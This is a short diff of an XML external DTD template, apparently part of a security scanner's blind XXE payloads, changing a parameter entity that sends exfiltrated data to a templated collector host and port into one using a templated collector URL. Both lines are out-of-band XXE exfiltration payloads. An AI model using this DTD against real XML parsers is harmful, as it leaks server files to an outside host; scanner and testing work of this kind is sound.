@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="utf-8"?>
 <!ENTITY % myall 
-    "<!ENTITY &#x25; send SYSTEM 'http://$collector_host:$collector_port/scan_id=$scan_id/exfiltrate_start=%exfiltrate_data;exfiltrate_end'>"
+    "<!ENTITY &#x25; send SYSTEM '$collector_url'>"
 >
 %myall;
